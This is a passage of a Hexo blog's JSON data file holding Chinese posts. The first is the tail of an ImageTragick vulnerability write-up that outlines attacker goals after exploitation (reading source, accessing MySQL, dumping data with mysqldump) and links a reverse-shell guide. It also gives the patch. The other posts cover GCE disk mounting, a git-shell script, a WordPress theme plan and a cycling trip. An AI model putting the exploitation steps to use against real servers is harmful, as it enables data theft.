target=\"_blank\" rel=\"noopener\">Linux建立反向shell的几种方式</a></p>\n</blockquote>\n<p>3 由于服务器执行PHP的用户默认是<code>nobody</code>，对web目录一般都没有写权限。那么能干什么呢？</p>\n<ol>\n<li>查看程序源代码</li>\n<li>获得mysql数据库的访问权限</li>\n<li>执行mysqldump等数据导出命令</li>\n</ol>\n<p>这个漏洞的主要的危害是数据泄漏。</p>\n<p>据传 <a href=\"http://nulled.io/\" target=\"_blank\" rel=\"noopener\">http://nulled.io/</a> 就是中了ImageMagick这个漏洞，导致9G大的数据库泄漏了。</p>\n<blockquote>\n<p><a href=\"http://www.freebuf.com/news/104757.html\" target=\"_blank\" rel=\"noopener\">国外知名黑客论坛被黑，疑因imageTragick漏洞</a></p>\n</blockquote>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p>这个漏洞影响ImageMagick 6.9.3-9以前的所有版本，可以通过更新ImageMagick库，或者在程序中用<code>getimagesize()</code>先对上传文件检验一下。</p>\n<p>详细方法见开头的分析链接。</p>\n"},{"title":"GCE的一些注意事项","id":"137","date":"2015-07-21T16:03:29.000Z","_content":"\nGCE用了几个月，还算不错，挺稳定的．我也遇到几个问题，整理出来：\n\n## 无法发送邮件\n\n这个没办法，google封锁了出口流量中的25等邮件端口（还包括SSL邮件端口）．能收取，但不能向外网主机发送邮件．\n\n官方说明: [https://cloud.google.com/compute/docs/tutorials/sending-mail/](https://cloud.google.com/compute/docs/tutorials/sending-mail/) 解决办法也在这文章下面\n\n## 控制台绑定硬盘不生效\n\n还需要手动挂载到系统目录，和阿里云一样．先确认是否绑定成功，查看当前硬盘列表:\n<pre class=\"\">$ ls -l /dev/disk/by-id/\nlrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/google-instance-3 -&gt; ../../sda\nlrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/google-instance-3-part1 -&gt; ../../sda1\nlrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/google-persistent-disk-1 -&gt; ../../sdb\nlrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3 -&gt; ../../sda\nlrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3-part1 -&gt; ../../sda1\nlrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 -&gt; ../../sdb\n</pre>\nOK，可以看到 **/dev/disk/by-id/google-persistent-disk-1** 就是新创建的硬盘 **disk-1**\n\n现在需要在机器中手动挂载，比如硬盘20G **disk-1** 在 **/dev/disk/by-id/google-persistent-disk-1**，想挂载到 **/data**\n<pre class=\"\">$ sudo /usr/share/google/safe_format_and_mount -m \"mkfs.ext4 -F\" /dev/disk/by-id/google-persistent-disk-1 /data\nsafe_format_and_mount: Running: fsck.xfs -a /dev/disk/by-id/google-persistent-disk-1\nsafe_format_and_mount: /sbin/fsck.xfs: XFS file system.\nsafe_format_and_mount: Running: mount -o discard,defaults /dev/disk/by-id/google-persistent-disk-1 /data\n$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        10G  7.2G  2.9G  72% /\ndevtmpfs        1.9G     0  1.9G   0% /dev\ntmpfs           1.9G     0  1.9G   0% /dev/shm\ntmpfs           1.9G  193M  1.7G  11% /run\ntmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/sdb         20G   45M   19G   1% /data\n</pre>\n可以看到生效了\n\n详细文档：[https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk](https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk)\n\n## 执行**gcloud**命令遇到 Insufficient Permission 错误\n\n这是gcloud配置还没有认证\n<pre class=\"\">$ sudo /usr/local/bin/gcloud auth login\n\n...  这里会给出一个授权网页链接，机器的账户授权后会给一个verification code\n\nEnter verification code: \n</pre>\n&nbsp;\n\n暂时就这些．总的来说挺喜欢GCE的，而且前3个月免费哦!","source":"_posts/gce-e7-9a-84-e4-b8-80-e4-ba-9b-e6-b3-a8-e6-84-8f-e4-ba-8b-e9-a1-b9.md","raw":"---\ntitle: GCE的一些注意事项\nid: 137\ncategories:\n  - linux\ndate: 2015-07-22 00:03:29\ntags:\n---\n\nGCE用了几个月，还算不错，挺稳定的．我也遇到几个问题，整理出来：\n\n## 无法发送邮件\n\n这个没办法，google封锁了出口流量中的25等邮件端口（还包括SSL邮件端口）．能收取，但不能向外网主机发送邮件．\n\n官方说明: [https://cloud.google.com/compute/docs/tutorials/sending-mail/](https://cloud.google.com/compute/docs/tutorials/sending-mail/) 解决办法也在这文章下面\n\n## 控制台绑定硬盘不生效\n\n还需要手动挂载到系统目录，和阿里云一样．先确认是否绑定成功，查看当前硬盘列表:\n<pre class=\"\">$ ls -l /dev/disk/by-id/\nlrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/google-instance-3 -&gt; ../../sda\nlrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/google-instance-3-part1 -&gt; ../../sda1\nlrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/google-persistent-disk-1 -&gt; ../../sdb\nlrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3 -&gt; ../../sda\nlrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3-part1 -&gt; ../../sda1\nlrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 -&gt; ../../sdb\n</pre>\nOK，可以看到 **/dev/disk/by-id/google-persistent-disk-1** 就是新创建的硬盘 **disk-1**\n\n现在需要在机器中手动挂载，比如硬盘20G **disk-1** 在 **/dev/disk/by-id/google-persistent-disk-1**，想挂载到 **/data**\n<pre class=\"\">$ sudo /usr/share/google/safe_format_and_mount -m \"mkfs.ext4 -F\" /dev/disk/by-id/google-persistent-disk-1 /data\nsafe_format_and_mount: Running: fsck.xfs -a /dev/disk/by-id/google-persistent-disk-1\nsafe_format_and_mount: /sbin/fsck.xfs: XFS file system.\nsafe_format_and_mount: Running: mount -o discard,defaults /dev/disk/by-id/google-persistent-disk-1 /data\n$ df -h\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        10G  7.2G  2.9G  72% /\ndevtmpfs        1.9G     0  1.9G   0% /dev\ntmpfs           1.9G     0  1.9G   0% /dev/shm\ntmpfs           1.9G  193M  1.7G  11% /run\ntmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/sdb         20G   45M   19G   1% /data\n</pre>\n可以看到生效了\n\n详细文档：[https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk](https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk)\n\n## 执行**gcloud**命令遇到 Insufficient Permission 错误\n\n这是gcloud配置还没有认证\n<pre class=\"\">$ sudo /usr/local/bin/gcloud auth login\n\n...  这里会给出一个授权网页链接，机器的账户授权后会给一个verification code\n\nEnter verification code: \n</pre>\n&nbsp;\n\n暂时就这些．总的来说挺喜欢GCE的，而且前3个月免费哦!","slug":"gce-e7-9a-84-e4-b8-80-e4-ba-9b-e6-b3-a8-e6-84-8f-e4-ba-8b-e9-a1-b9","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimv00hqgmlm98ipyshz","content":"<p>GCE用了几个月，还算不错，挺稳定的．我也遇到几个问题，整理出来：</p>\n<h2 id=\"无法发送邮件\"><a href=\"#无法发送邮件\" class=\"headerlink\" title=\"无法发送邮件\"></a>无法发送邮件</h2><p>这个没办法，google封锁了出口流量中的25等邮件端口（还包括SSL邮件端口）．能收取，但不能向外网主机发送邮件．</p>\n<p>官方说明: <a href=\"https://cloud.google.com/compute/docs/tutorials/sending-mail/\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/compute/docs/tutorials/sending-mail/</a> 解决办法也在这文章下面</p>\n<h2 id=\"控制台绑定硬盘不生效\"><a href=\"#控制台绑定硬盘不生效\" class=\"headerlink\" title=\"控制台绑定硬盘不生效\"></a>控制台绑定硬盘不生效</h2><p>还需要手动挂载到系统目录，和阿里云一样．先确认是否绑定成功，查看当前硬盘列表:</p>\n<p><pre class=\"\">$ ls -l /dev/disk/by-id/<br>lrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/google-instance-3 -&gt; ../../sda<br>lrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/google-instance-3-part1 -&gt; ../../sda1<br>lrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/google-persistent-disk-1 -&gt; ../../sdb<br>lrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3 -&gt; ../../sda<br>lrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3-part1 -&gt; ../../sda1<br>lrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 -&gt; ../../sdb<br></pre><br>OK，可以看到 <strong>/dev/disk/by-id/google-persistent-disk-1</strong> 就是新创建的硬盘 <strong>disk-1</strong></p>\n<p>现在需要在机器中手动挂载，比如硬盘20G <strong>disk-1</strong> 在 <strong>/dev/disk/by-id/google-persistent-disk-1</strong>，想挂载到 <strong>/data</strong></p>\n<p><pre class=\"\">$ sudo /usr/share/google/safe_format_and_mount -m “mkfs.ext4 -F” /dev/disk/by-id/google-persistent-disk-1 /data<br>safe_format_and_mount: Running: fsck.xfs -a /dev/disk/by-id/google-persistent-disk-1<br>safe_format_and_mount: /sbin/fsck.xfs: XFS file system.<br>safe_format_and_mount: Running: mount -o discard,defaults /dev/disk/by-id/google-persistent-disk-1 /data<br>$ df -h<br>Filesystem      Size  Used Avail Use% Mounted on<br>/dev/sda1        10G  7.2G  2.9G  72% /<br>devtmpfs        1.9G     0  1.9G   0% /dev<br>tmpfs           1.9G     0  1.9G   0% /dev/shm<br>tmpfs           1.9G  193M  1.7G  11% /run<br>tmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup<br>/dev/sdb         20G   45M   19G   1% /data<br></pre><br>可以看到生效了</p>\n<p>详细文档：<a href=\"https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk</a></p>\n<h2 id=\"执行gcloud命令遇到-Insufficient-Permission-错误\"><a href=\"#执行gcloud命令遇到-Insufficient-Permission-错误\" class=\"headerlink\" title=\"执行gcloud命令遇到 Insufficient Permission 错误\"></a>执行<strong>gcloud</strong>命令遇到 Insufficient Permission 错误</h2><p>这是gcloud配置还没有认证</p>\n<p><pre class=\"\">$ sudo /usr/local/bin/gcloud auth login</pre></p>\n<p>…  这里会给出一个授权网页链接，机器的账户授权后会给一个verification code</p>\n<p>Enter verification code:<br><br>&nbsp;</p>\n<p>暂时就这些．总的来说挺喜欢GCE的，而且前3个月免费哦!</p>\n","site":{"data":{}},"excerpt":"","more":"<p>GCE用了几个月，还算不错，挺稳定的．我也遇到几个问题，整理出来：</p>\n<h2 id=\"无法发送邮件\"><a href=\"#无法发送邮件\" class=\"headerlink\" title=\"无法发送邮件\"></a>无法发送邮件</h2><p>这个没办法，google封锁了出口流量中的25等邮件端口（还包括SSL邮件端口）．能收取，但不能向外网主机发送邮件．</p>\n<p>官方说明: <a href=\"https://cloud.google.com/compute/docs/tutorials/sending-mail/\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/compute/docs/tutorials/sending-mail/</a> 解决办法也在这文章下面</p>\n<h2 id=\"控制台绑定硬盘不生效\"><a href=\"#控制台绑定硬盘不生效\" class=\"headerlink\" title=\"控制台绑定硬盘不生效\"></a>控制台绑定硬盘不生效</h2><p>还需要手动挂载到系统目录，和阿里云一样．先确认是否绑定成功，查看当前硬盘列表:</p>\n<p><pre class=\"\">$ ls -l /dev/disk/by-id/<br>lrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/google-instance-3 -&gt; ../../sda<br>lrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/google-instance-3-part1 -&gt; ../../sda1<br>lrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/google-persistent-disk-1 -&gt; ../../sdb<br>lrwxrwxrwx. 1 root root  9 Jun 14 03:30 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3 -&gt; ../../sda<br>lrwxrwxrwx. 1 root root 10 Jul 21 23:10 /dev/disk/by-id/scsi-0Google_PersistentDisk_instance-3-part1 -&gt; ../../sda1<br>lrwxrwxrwx. 1 root root  9 Jul 21 23:27 /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 -&gt; ../../sdb<br></pre><br>OK，可以看到 <strong>/dev/disk/by-id/google-persistent-disk-1</strong> 就是新创建的硬盘 <strong>disk-1</strong></p>\n<p>现在需要在机器中手动挂载，比如硬盘20G <strong>disk-1</strong> 在 <strong>/dev/disk/by-id/google-persistent-disk-1</strong>，想挂载到 <strong>/data</strong></p>\n<p><pre class=\"\">$ sudo /usr/share/google/safe_format_and_mount -m “mkfs.ext4 -F” /dev/disk/by-id/google-persistent-disk-1 /data<br>safe_format_and_mount: Running: fsck.xfs -a /dev/disk/by-id/google-persistent-disk-1<br>safe_format_and_mount: /sbin/fsck.xfs: XFS file system.<br>safe_format_and_mount: Running: mount -o discard,defaults /dev/disk/by-id/google-persistent-disk-1 /data<br>$ df -h<br>Filesystem      Size  Used Avail Use% Mounted on<br>/dev/sda1        10G  7.2G  2.9G  72% /<br>devtmpfs        1.9G     0  1.9G   0% /dev<br>tmpfs           1.9G     0  1.9G   0% /dev/shm<br>tmpfs           1.9G  193M  1.7G  11% /run<br>tmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup<br>/dev/sdb         20G   45M   19G   1% /data<br></pre><br>可以看到生效了</p>\n<p>详细文档：<a href=\"https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk\" target=\"_blank\" rel=\"noopener\">https://cloud.google.com/compute/docs/disks/persistent-disks#attach_disk</a></p>\n<h2 id=\"执行gcloud命令遇到-Insufficient-Permission-错误\"><a href=\"#执行gcloud命令遇到-Insufficient-Permission-错误\" class=\"headerlink\" title=\"执行gcloud命令遇到 Insufficient Permission 错误\"></a>执行<strong>gcloud</strong>命令遇到 Insufficient Permission 错误</h2><p>这是gcloud配置还没有认证</p>\n<p><pre class=\"\">$ sudo /usr/local/bin/gcloud auth login</pre></p>\n<p>…  这里会给出一个授权网页链接，机器的账户授权后会给一个verification code</p>\n<p>Enter verification code:<br><br>&nbsp;</p>\n<p>暂时就这些．总的来说挺喜欢GCE的，而且前3个月免费哦!</p>\n"},{"title":"自定义git-shell命令","id":"141","date":"2015-07-22T15:57:59.000Z","_content":"\n之前写过搭建自己的git服务器，其中提到了使用git-shell来限制git用户的权限．参见: **[搭建自己的git服务器](https://xiaoai.me/?p=70 \"编辑“搭建自己的git服务器”\") **https://xiaoai.me/?p=70\n\n默认的，git-shell只提供了**list**命令，即显示仓库列表．有时还需要扩展它的功能，比如创建一个新的空仓库：\n\n## 创建命令\n\n只需要在git-shell目录下增加一个可执行文件，比如就叫 **create**\n<pre>$ cd /home/git\n$ sudo vi git-shell-commands/create\n#/bin/sh\ngit init --bare $1.git;\n$ sudo chmod a+x git-shell-commands/create\n</pre>\n这里的**/home/git**就是git用户的主目录，也就是存放所有仓库的目录．**git-shell-commands/create **就是创建新仓库的脚本，它的参数 **$1 **就是传入的新仓库名\n\n## 调用命令\n\n<pre>$ ssh git@xiaoai.me\nRun 'help' for help, or 'exit' to leave.  Available commands:\ncreate\nlist\ngit&gt; create hello\nInitialized empty Git repository in /home/git/hello.git/\n</pre>\n至此就算扩展了一个新功能，挺简单的","source":"_posts/e8-87-aa-e5-ae-9a-e4-b9-89git-shell-e5-91-bd-e4-bb-a4.md","raw":"---\ntitle: 自定义git-shell命令\nid: 141\ncategories:\n  - linux\ndate: 2015-07-22 23:57:59\ntags:\n---\n\n之前写过搭建自己的git服务器，其中提到了使用git-shell来限制git用户的权限．参见: **[搭建自己的git服务器](https://xiaoai.me/?p=70 \"编辑“搭建自己的git服务器”\") **https://xiaoai.me/?p=70\n\n默认的，git-shell只提供了**list**命令，即显示仓库列表．有时还需要扩展它的功能，比如创建一个新的空仓库：\n\n## 创建命令\n\n只需要在git-shell目录下增加一个可执行文件，比如就叫 **create**\n<pre>$ cd /home/git\n$ sudo vi git-shell-commands/create\n#/bin/sh\ngit init --bare $1.git;\n$ sudo chmod a+x git-shell-commands/create\n</pre>\n这里的**/home/git**就是git用户的主目录，也就是存放所有仓库的目录．**git-shell-commands/create **就是创建新仓库的脚本，它的参数 **$1 **就是传入的新仓库名\n\n## 调用命令\n\n<pre>$ ssh git@xiaoai.me\nRun 'help' for help, or 'exit' to leave.  Available commands:\ncreate\nlist\ngit&gt; create hello\nInitialized empty Git repository in /home/git/hello.git/\n</pre>\n至此就算扩展了一个新功能，挺简单的","slug":"e8-87-aa-e5-ae-9a-e4-b9-89git-shell-e5-91-bd-e4-bb-a4","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimw00hsgmlm87p938nb","content":"<p>之前写过搭建自己的git服务器，其中提到了使用git-shell来限制git用户的权限．参见: <strong><a href=\"https://xiaoai.me/?p=70\" title=\"编辑“搭建自己的git服务器”\" target=\"_blank\" rel=\"noopener\">搭建自己的git服务器</a> </strong><a href=\"https://xiaoai.me/?p=70\" target=\"_blank\" rel=\"noopener\">https://xiaoai.me/?p=70</a></p>\n<p>默认的，git-shell只提供了<strong>list</strong>命令，即显示仓库列表．有时还需要扩展它的功能，比如创建一个新的空仓库：</p>\n<h2 id=\"创建命令\"><a href=\"#创建命令\" class=\"headerlink\" title=\"创建命令\"></a>创建命令</h2><p>只需要在git-shell目录下增加一个可执行文件，比如就叫 <strong>create</strong></p>\n<p><pre>$ cd /home/git<br>$ sudo vi git-shell-commands/create</pre></p>\n<p>#/bin/sh<br>git init –bare $1.git;<br>$ sudo chmod a+x git-shell-commands/create<br><br>这里的<strong>/home/git</strong>就是git用户的主目录，也就是存放所有仓库的目录．<strong>git-shell-commands/create </strong>就是创建新仓库的脚本，它的参数 <strong>$1 </strong>就是传入的新仓库名</p>\n<h2 id=\"调用命令\"><a href=\"#调用命令\" class=\"headerlink\" title=\"调用命令\"></a>调用命令</h2><p><pre>$ ssh <a href=\"mailto:git@xiaoai.me\" target=\"_blank\" rel=\"noopener\">git@xiaoai.me</a><br>Run ‘help’ for help, or ‘exit’ to leave.  Available commands:<br>create<br>list<br>git&gt; create hello<br>Initialized empty Git repository in /home/git/hello.git/<br></pre><br>至此就算扩展了一个新功能，挺简单的</p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前写过搭建自己的git服务器，其中提到了使用git-shell来限制git用户的权限．参见: <strong><a href=\"https://xiaoai.me/?p=70\" title=\"编辑“搭建自己的git服务器”\" target=\"_blank\" rel=\"noopener\">搭建自己的git服务器</a> </strong><a href=\"https://xiaoai.me/?p=70\" target=\"_blank\" rel=\"noopener\">https://xiaoai.me/?p=70</a></p>\n<p>默认的，git-shell只提供了<strong>list</strong>命令，即显示仓库列表．有时还需要扩展它的功能，比如创建一个新的空仓库：</p>\n<h2 id=\"创建命令\"><a href=\"#创建命令\" class=\"headerlink\" title=\"创建命令\"></a>创建命令</h2><p>只需要在git-shell目录下增加一个可执行文件，比如就叫 <strong>create</strong></p>\n<p><pre>$ cd /home/git<br>$ sudo vi git-shell-commands/create</pre></p>\n<p>#/bin/sh<br>git init –bare $1.git;<br>$ sudo chmod a+x git-shell-commands/create<br><br>这里的<strong>/home/git</strong>就是git用户的主目录，也就是存放所有仓库的目录．<strong>git-shell-commands/create </strong>就是创建新仓库的脚本，它的参数 <strong>$1 </strong>就是传入的新仓库名</p>\n<h2 id=\"调用命令\"><a href=\"#调用命令\" class=\"headerlink\" title=\"调用命令\"></a>调用命令</h2><p><pre>$ ssh <a href=\"mailto:git@xiaoai.me\" target=\"_blank\" rel=\"noopener\">git@xiaoai.me</a><br>Run ‘help’ for help, or ‘exit’ to leave.  Available commands:<br>create<br>list<br>git&gt; create hello<br>Initialized empty Git repository in /home/git/hello.git/<br></pre><br>至此就算扩展了一个新功能，挺简单的</p>\n"},{"title":"自己做了个WP主题","id":"291","date":"2016-02-07T13:15:55.000Z","_content":"\n之前用过许多WP模版，但是都不符合心意。我理想的博客应该有以下特点：\n1\\. 页面简洁，一切都应围绕阅读\n2\\. 资源小巧，初次加载应该控制在50K，不能用jQuery\n3\\. 每篇文章，有标题摘要导航，类同segmentfault\n\n所以这两天用bootstrap3写了一个简单的博客，页面非常的简单，或者说简陋。\n\n当前只是基本的显示，像WP的工具栏还没有做好。\n\n接下来还会迭代：\n1\\. 文章标题摘要导航\n2\\. 补充工具栏的样式\n3\\. 补充评论的样式，后面会废掉disqus，因为它需要的资源很多。\n4\\. 重构模版，现在列表和详情都混合在一起。\n\n等迭代的差不多了，我想把它发布到wp themes上。","source":"_posts/e8-87-aa-e5-b7-b1-e5-81-9a-e4-ba-86-e4-b8-aawp-e4-b8-bb-e9-a2-98.md","raw":"---\ntitle: 自己做了个WP主题\nid: 291\ncategories:\n  - 前端\ndate: 2016-02-07 21:15:55\ntags:\n---\n\n之前用过许多WP模版，但是都不符合心意。我理想的博客应该有以下特点：\n1\\. 页面简洁，一切都应围绕阅读\n2\\. 资源小巧，初次加载应该控制在50K，不能用jQuery\n3\\. 每篇文章，有标题摘要导航，类同segmentfault\n\n所以这两天用bootstrap3写了一个简单的博客，页面非常的简单，或者说简陋。\n\n当前只是基本的显示，像WP的工具栏还没有做好。\n\n接下来还会迭代：\n1\\. 文章标题摘要导航\n2\\. 补充工具栏的样式\n3\\. 补充评论的样式，后面会废掉disqus，因为它需要的资源很多。\n4\\. 重构模版，现在列表和详情都混合在一起。\n\n等迭代的差不多了，我想把它发布到wp themes上。","slug":"e8-87-aa-e5-b7-b1-e5-81-9a-e4-ba-86-e4-b8-aawp-e4-b8-bb-e9-a2-98","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimx00hugmlm2k1lvcsp","content":"<p>之前用过许多WP模版，但是都不符合心意。我理想的博客应该有以下特点：<br>1. 页面简洁，一切都应围绕阅读<br>2. 资源小巧，初次加载应该控制在50K，不能用jQuery<br>3. 每篇文章，有标题摘要导航，类同segmentfault</p>\n<p>所以这两天用bootstrap3写了一个简单的博客，页面非常的简单，或者说简陋。</p>\n<p>当前只是基本的显示，像WP的工具栏还没有做好。</p>\n<p>接下来还会迭代：<br>1. 文章标题摘要导航<br>2. 补充工具栏的样式<br>3. 补充评论的样式，后面会废掉disqus，因为它需要的资源很多。<br>4. 重构模版，现在列表和详情都混合在一起。</p>\n<p>等迭代的差不多了，我想把它发布到wp themes上。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前用过许多WP模版，但是都不符合心意。我理想的博客应该有以下特点：<br>1. 页面简洁，一切都应围绕阅读<br>2. 资源小巧，初次加载应该控制在50K，不能用jQuery<br>3. 每篇文章，有标题摘要导航，类同segmentfault</p>\n<p>所以这两天用bootstrap3写了一个简单的博客，页面非常的简单，或者说简陋。</p>\n<p>当前只是基本的显示，像WP的工具栏还没有做好。</p>\n<p>接下来还会迭代：<br>1. 文章标题摘要导航<br>2. 补充工具栏的样式<br>3. 补充评论的样式，后面会废掉disqus，因为它需要的资源很多。<br>4. 重构模版，现在列表和详情都混合在一起。</p>\n<p>等迭代的差不多了，我想把它发布到wp themes上。</p>\n"},{"title":"川藏线骑行游记","id":"307","date":"2016-05-19T21:53:15.000Z","_content":"\n一直有骑行川藏线的想法，计划了很长时间。现在这段旅程已经过去两周了，这才想起要记录下来。\n\n## 出发\n\n5月3号抵达成都，在成都玩了3天。景点就去了武侯祠，感觉很不好。既要收门票，并且没什么特色，跟个公园差不多。\n\n然后5号开始了川藏南线的骑行\n\n## D1:邛崃市\n\n一路都是成都平原，马路两边都是农田，只是第一次见到四川盆地的水稻。\n\n## D2:雅安市\n\n后半段终于有山坡了，随处可见的茶园和酒厂。\n\n雅安也叫雨城，每天都会下阵雨。\n\n## D3:天全县紫石乡\n\n天全线正在修雅安-康定的高速，影响到国道的通行了。道路单向行驶，所以我只好推着车子走了大部分路。5点的时候在路边的农家乐住下了，60块钱的房费，感觉还行。就是半夜的时候，山上到处都是青蛙叫，害得我一夜没睡好。\n\n## D4:泸定县\n\n去往泸定县要翻越二郎山，连续二十几公里都是蜿蜒盘旋的上山路，从出发就一直在推车。山坡上遇到了四川的骑友小胡，我俩结伴骑到了泸定。\n\n快到山顶时，终于要穿越二郎山隧道。感觉隧道很恐怖，也许是我的车子尾灯不够亮，总担心后面有车撞到我。\n\n过了隧道就又是连续的下坡路了。用了半天时间上山，结果半个小时就下去了。\n\n到泸定县城的时候，看到路边的骑行者之家。看到老板娘很漂亮就没多想，结果住宿的体验很差，什么都没有。不过也很便宜，双人间60块钱而已。\n\n## D5:康定县\n\n去康定的路上，是连续二十几公里的上坡路，加上太阳的暴晒，让我非常苦恼。\n\n最后我选择了放弃继续前行，在康定把车子快递回去，连夜返回了成都。\n\nEND\n\n现在想想挺遗憾当时的决定，明年有时间要把没骑完的旅程补上。","source":"_posts/e5-b7-9d-e8-97-8f-e7-ba-bf-e9-aa-91-e8-a1-8c-e6-b8-b8-e8-ae-b0.md","raw":"---\ntitle: 川藏线骑行游记\nid: 307\ncategories:\n  - 骑行\ndate: 2016-05-20 05:53:15\ntags:\n---\n\n一直有骑行川藏线的想法，计划了很长时间。现在这段旅程已经过去两周了，这才想起要记录下来。\n\n## 出发\n\n5月3号抵达成都，在成都玩了3天。景点就去了武侯祠，感觉很不好。既要收门票，并且没什么特色，跟个公园差不多。\n\n然后5号开始了川藏南线的骑行\n\n## D1:邛崃市\n\n一路都是成都平原，马路两边都是农田，只是第一次见到四川盆地的水稻。\n\n## D2:雅安市\n\n后半段终于有山坡了，随处可见的茶园和酒厂。\n\n雅安也叫雨城，每天都会下阵雨。\n\n## D3:天全县紫石乡\n\n天全线正在修雅安-康定的高速，影响到国道的通行了。道路单向行驶，所以我只好推着车子走了大部分路。5点的时候在路边的农家乐住下了，60块钱的房费，感觉还行。就是半夜的时候，山上到处都是青蛙叫，害得我一夜没睡好。\n\n## D4:泸定县\n\n去往泸定县要翻越二郎山，连续二十几公里都是蜿蜒盘旋的上山路，从出发就一直在推车。山坡上遇到了四川的骑友小胡，我俩结伴骑到了泸定。\n\n快到山顶时，终于要穿越二郎山隧道。感觉隧道很恐怖，也许是我的车子尾灯不够亮，总担心后面有车撞到我。\n\n过了隧道就又是连续的下坡路了。用了半天时间上山，结果半个小时就下去了。\n\n到泸定县城的时候，看到路边的骑行者之家。看到老板娘很漂亮就没多想，结果住宿的体验很差，什么都没有。不过也很便宜，双人间60块钱而已。\n\n## D5:康定县\n\n去康定的路上，是连续二十几公里的上坡路，加上太阳的暴晒，让我非常苦恼。\n\n最后我选择了放弃继续前行，在康定把车子快递回去，连夜返回了成都。\n\nEND\n\n现在想想挺遗憾当时的决定，明年有时间要把没骑完的旅程补上。","slug":"e5-b7-9d-e8-97-8f-e7-ba-bf-e9-aa-91-e8-a1-8c-e6-b8-b8-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cimy00hwgmlmsfzhb28k","content":"<p>一直有骑行川藏线的想法，计划了很长时间。现在这段旅程已经过去两周了，这才想起要记录下来。</p>\n<h2 id=\"出发\"><a href=\"#出发\" class=\"headerlink\" title=\"出发\"></a>出发</h2><p>5月3号抵达成都，在成都玩了3天。景点就去了武侯祠，感觉很不好。既要收门票，并且没什么特色，跟个公园差不多。</p>\n<p>然后5号开始了川藏南线的骑行</p>\n<h2 id=\"D1-邛崃市\"><a href=\"#D1-邛崃市\" class=\"headerlink\" title=\"D1:邛崃市\"></a>D1:邛崃市</h2><p>一路都是成都平原，马路两边都是农田，只是第一次见到四川盆地的水稻。</p>\n<h2 id=\"D2-雅安市\"><a href=\"#D2-雅安市\" class=\"headerlink\" title=\"D2:雅安市\"></a>D2:雅安市</h2><p>后半段终于有山坡了，随处可见的茶园和酒厂。</p>\n<p>雅安也叫雨城，每天都会下阵雨。</p>\n<h2 id=\"D3-天全县紫石乡\"><a href=\"#D3-天全县紫石乡\" class=\"headerlink\" title=\"D3:天全县紫石乡\"></a>D3:天全县紫石乡</h2><p>天全线正在修雅安-康定的高速，影响到国道的通行了。道路单向行驶，所以我只好推着车子走了大部分路。5点的时候在路边的农家乐住下了，60块钱的房费，感觉还行。就是半夜的时候，山上到处都是青蛙叫，害得我一夜没睡好。</p>\n<h2 id=\"D4-泸定县\"><a href=\"#D4-泸定县\" class=\"headerlink\" 